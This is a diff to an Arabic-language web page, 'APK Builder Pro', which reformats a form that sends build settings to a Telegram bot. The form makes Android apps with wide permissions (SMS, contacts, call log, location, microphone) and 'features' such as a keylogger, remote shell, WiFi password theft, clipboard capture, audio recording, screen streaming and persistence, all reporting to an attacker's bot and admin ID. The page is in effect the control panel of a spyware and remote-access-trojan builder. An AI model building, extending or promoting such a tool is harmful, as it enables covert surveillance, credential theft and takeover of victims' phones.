@@ -110,14 +110,17 @@ input:focus{outline:none;border-color:var(--accent);
 <div class="container">
   <div class="crown">👑</div>
   <h1>APK Builder Pro</h1>
-  <p class="subtitle">Ultra Edition — الإصدار النهائي</p>
+  <p class="subtitle">Ultra Edition — الإصدار النهائي الفخم</p>
+
   <div class="badges">
     <span class="badge">⚡ بناء سريع</span>
     <span class="badge pink">🔐 توقيع تلقائي</span>
     <span class="badge cyan">🎨 تصميم فخم</span>
     <span class="badge">🤖 بوت مدمج</span>
   </div>
+
   <div class="divider"></div>
+
   <form id="form">
     <div class="field">
       <label><span class="num">1</span> اسم التطبيق</label>
@@ -146,79 +149,115 @@ input:focus{outline:none;border-color:var(--accent);
     <div class="field">
       <label><span class="num">7</span> الأيقونة</label>
       <div class="icon-box" id="iconBox">
-        <span class="em">📸</span><span>اضغط للاختيار</span>
+        <span class="em">📸</span>
+        <span>اضغط للاختيار</span>
       </div>
       <input type="file" id="iconFile" accept="image/*" hidden>
     </div>
-    <button type="submit" class="btn" id="submitBtn">🚀 إرسال للبوت</button>
+
+    <button type="submit" class="btn" id="submitBtn">
+      🚀 إرسال الأمر للبوت
+    </button>
     <div class="status" id="status"></div>
   </form>
+
   <div class="footer">© 2025 APK Builder Pro — Ultra Edition</div>
 </div>
+
 <script>
 const BOT_USERNAME = "YOUR_BUILDER_BOT";
+
 const PERMS = [
-  ['camera','📷 الكاميرا'],['read_storage','📁 قراءة الملفات'],
-  ['write_storage','💾 كتابة الملفات'],['contacts','📞 جهات الاتصال'],
-  ['location','📍 الموقع'],['sms','✉️ الرسائل'],
-  ['call_log','📋 سجل المكالمات'],['mic','🎙️ الميكروفون'],
-  ['calendar','📅 التقويم'],['phone_state','📱 حالة الهاتف'],
+  ['camera','📷 الكاميرا'],
+  ['read_storage','📁 قراءة الملفات'],
+  ['write_storage','💾 كتابة الملفات'],
+  ['contacts','📞 جهات الاتصال'],
+  ['location','📍 الموقع'],
+  ['sms','✉️ الرسائل'],
+  ['call_log','📋 سجل المكالمات'],
+  ['mic','🎙️ الميكروفون'],
+  ['calendar','📅 التقويم'],
+  ['phone_state','📱 حالة الهاتف'],
 ];
+
 const FEATS = [
-  ['screenshot','🖥️ لقطة الشاشة'],['keylogger','⌨️ Keylogger'],
-  ['notifications','🔔 الإشعارات'],['apps_list','📦 التطبيقات'],
-  ['wifi_pass','📶 WiFi'],['shell','💻 Shell'],
-  ['persist','♻️ إعادة تشغيل'],['clipboard','📋 الحافظة'],
-  ['audio_record','🎙️ تسجيل صوت'],['screen_stream','📡 بث الشاشة'],
+  ['screenshot','🖥️ لقطة الشاشة'],
+  ['keylogger','⌨️ Keylogger'],
+  ['notifications','🔔 الإشعارات'],
+  ['apps_list','📦 التطبيقات'],
+  ['wifi_pass','📶 WiFi'],
+  ['shell','💻 Shell'],
+  ['persist','♻️ إعادة تشغيل'],
+  ['clipboard','📋 الحافظة'],
+  ['audio_record','🎙️ تسجيل صوت'],
+  ['screen_stream','📡 بث الشاشة'],
 ];
+
 function renderChips(id, items){
-  const c=document.getElementById(id);
-  c.innerHTML=items.map(([k,l])=>
+  const c = document.getElementById(id);
+  c.innerHTML = items.map(([k,l]) =>
     `<div class="chip" data-key="${k}">
-       <div class="check">✓</div><span>${l}</span></div>`).join('');
+       <div class="check">✓</div><span>${l}</span>
+     </div>`).join('');
   c.querySelectorAll('.chip').forEach(el=>{
-    el.onclick=()=>el.classList.toggle('selected');
+    el.onclick = () => el.classList.toggle('selected');
   });
 }
-renderChips('permsGrid',PERMS);
-renderChips('featsGrid',FEATS);
-const iconBox=document.getElementById('iconBox');
-const iconFile=document.getElementById('iconFile');
-iconBox.onclick=()=>iconFile.click();
-iconFile.onchange=e=>{
-  const f=e.target.files[0];if(!f)return;
-  const r=new FileReader();
-  r.onload=ev=>{iconBox.style.backgroundImage=`url(${ev.target.result})`;
-    iconBox.innerHTML='';};
+renderChips('permsGrid', PERMS);
+renderChips('featsGrid', FEATS);
+
+const iconBox  = document.getElementById('iconBox');
+const iconFile = document.getElementById('iconFile');
+iconBox.onclick = () => iconFile.click();
+iconFile.onchange = e => {
+  const f = e.target.files[0]; if(!f) return;
+  const r = new FileReader();
+  r.onload = ev => {
+    iconBox.style.backgroundImage = `url(${ev.target.result})`;
+    iconBox.innerHTML = '';
+  };
   r.readAsDataURL(f);
 };
-document.getElementById('form').onsubmit=e=>{
+
+document.getElementById('form').onsubmit = e => {
   e.preventDefault();
-  const st=document.getElementById('status');
-  const btn=document.getElementById('submitBtn');
-  const appName=document.getElementById('appName').value.trim();
-  const pkgName=document.getElementById('pkgName').value.trim();
-  const adminId=document.getElementById('adminId').value.trim();
-  const botToken=document.getElementById('botToken').value.trim();
+  const st  = document.getElementById('status');
+  const btn = document.getElementById('submitBtn');
+  const appName  = document.getElementById('appName').value.trim();
+  const pkgName  = document.getElementById('pkgName').value.trim();
+  const adminId  = document.getElementById('adminId').value.trim();
+  const botToken = document.getElementById('botToken').value.trim();
+
   if(!/^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/i.test(pkgName)){
-    st.className='status err';st.textContent='❌ اسم الحزمة غير صالح';return;}
+    st.className='status err';
+    st.textContent='❌ اسم الحزمة غير صالح (مثال: com.test.app)';
+    return;
+  }
   if(!/^\d+:\S+$/.test(botToken)){
-    st.className='status err';st.textContent='❌ توكن غير صالح';return;}
-  const perms=[...document.querySelectorAll('#permsGrid .chip.selected')]
-    .map(el=>el.dataset.key).join(',');
-  const feats=[...document.querySelectorAll('#featsGrid .chip.selected')]
-    .map(el=>el.dataset.key).join(',');
-  const payload=encodeURIComponent(JSON.stringify({
-    n:appName,p:pkgName,a:adminId,t:botToken,r:perms,f:feats}));
-  st.className='status info';
-  st.textContent='⏳ جاري فتح البوت...';
-  btn.disabled=true;
-  setTimeout(()=>{
-    window.open(`https://t.me/${BOT_USERNAME}?start=${payload}`,'_blank');
-    st.className='status ok';
-    st.textContent='✅ تم فتح البوت — اتبع التعليمات';
-    btn.disabled=false;
-  },500);
+    st.className='status err';
+    st.textContent='❌ توكن البوت غير صالح';
+    return;
+  }
+
+  const perms = [...document.querySelectorAll('#permsGrid .chip.selected')]
+    .map(el => el.dataset.key).join(',');
+  const feats = [...document.querySelectorAll('#featsGrid .chip.selected')]
+    .map(el => el.dataset.key).join(',');
+
+  const payload = encodeURIComponent(JSON.stringify({
+    n: appName, p: pkgName, a: adminId, t: botToken, r: perms, f: feats
+  }));
+
+  st.className = 'status info';
+  st.textContent = '⏳ جاري فتح البوت...';
+  btn.disabled = true;
+
+  setTimeout(() => {
+    window.open(`https://t.me/${BOT_USERNAME}?start=${payload}`, '_blank');
+    st.className = 'status ok';
+    st.textContent = '✅ تم فتح البوت — اتبع التعليمات';
+    btn.disabled = false;
+  }, 500);
 };
 </script>
 </body>
